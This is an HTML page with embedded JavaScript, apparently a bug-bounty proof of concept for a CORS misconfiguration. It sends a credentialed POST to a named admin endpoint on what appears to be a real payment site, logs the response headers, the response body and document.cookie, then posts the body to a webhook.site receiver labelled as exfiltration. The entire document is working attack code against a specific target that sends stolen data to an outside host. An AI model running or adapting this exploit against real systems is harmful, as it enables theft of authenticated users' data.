<!doctype html>
<html>
<head><meta charset="utf-8"><title>CORS PoC — exfil body</title></head>
<body>
<h3>CORS PoC — exfiltrate response body</h3>
<button id="go">Run PoC</button>
<pre id="out"></pre>
<script>
const TARGET = "https://admin.aakashpay.com/_app/admin/new/admin/"; 
const RECEIVER = "https://webhook.site/0fd36535-ea21-4921-a838-dc158ef52167"; 

function log(s){ document.getElementById('out').textContent += s + "\n"; }

document.getElementById('go').onclick = async () => {
  document.getElementById('out').textContent = "";
  log("page origin: " + location.origin);
  try {
    const resp = await fetch(TARGET, {
      method: "POST",
      credentials: "include",
      headers: { "Accept": "application/json"} 
    });
    log("Fetch resolved: status=" + resp.status + " ok=" + resp.ok);
    log("Response headers:");
    for (const [k,v] of resp.headers) log(k + ": " + v);

    const body = await resp.text();
    log("Body :\n" + body);
    log("Cookie" + document.cookie)

    try {
      await fetch(RECEIVER, {
        method: "POST",
        mode: "no-cors",
        body: "exfil=" + encodeURIComponent(body)
      });
      log("Exfil attempted to webhook.site");
    } catch (e) {
      log("Exfil fetch error: " + e);
    }
  } catch (e) {
    log("Fetch error: " + e);
    log("See DevTools Network for more details (request headers, status, and OPTIONS).");
  }
};
</script>
</body>
</html>
 
